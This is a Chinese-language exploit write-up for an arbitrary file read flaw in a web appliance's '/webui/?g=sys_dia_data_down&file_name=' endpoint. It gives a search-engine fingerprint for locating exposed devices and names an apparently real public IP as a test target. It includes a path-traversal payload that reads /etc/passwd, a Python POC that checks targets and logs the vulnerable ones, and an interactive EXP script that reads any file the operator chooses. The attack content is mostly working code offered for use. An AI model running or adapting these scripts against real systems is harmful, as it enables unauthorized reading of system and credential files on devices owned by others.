## 一、资产搜索

```
body="webui/js/jquerylib/jquery-1.7.2.min.js"
```

## 二、网站测试

```
http://123.7.138.247:6008
```

## 三、验证漏洞

```
/webui/?g=sys_dia_data_down&file_name=../../../../../etc/passwd
```

![image-20240914203625179](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240914203625179.png)

## 四、POC

```
def poc(target):
    payload = "/webui/?g=sys_dia_data_down&file_name=../../../../../etc/passwd"
    try:
        res1 = requests.get(target,verify=False)
        if res1.status_code == 200:
            res2 = requests.get(url=target+payload,verify=False,timeout=5)
            if "root" in res2.text:
                with open("result.txt","a",encoding="utf-8") as f:
                    f.write(f"该网站[+]{target}存在任意文件读取漏洞\n")
                    return True
            else:
                print(f"该网站[+]{target}不存在任意文件读取漏洞")
        else:
            print(f"该网站[+]{target}有问题，请手动测试！！")
    except Exception as e:
        print(e)
```

## 五、EXP

```
def exp(target):
    while True:
        content = input("请输入要查看的路径，从/目录开始输入(q退出)\n>>>>>>>>>>>>>>>>>>")
        payload = "/webui/?g=sys_dia_data_down&file_name=../../../../.."
        res1 = requests.get(target, verify=False)
        if content == "q":
            exit()
        if res1.status_code == 200:
            res2 = requests.get(url=target + payload +content, verify=False, timeout=5)
            print(res2.text)
        else:
            print("该文件不存在，请重新输入！！")
```

## 六、测试结果

![image-20240914204321889](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240914204321889.png)

![image-20240914204349280](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240914204349280.png)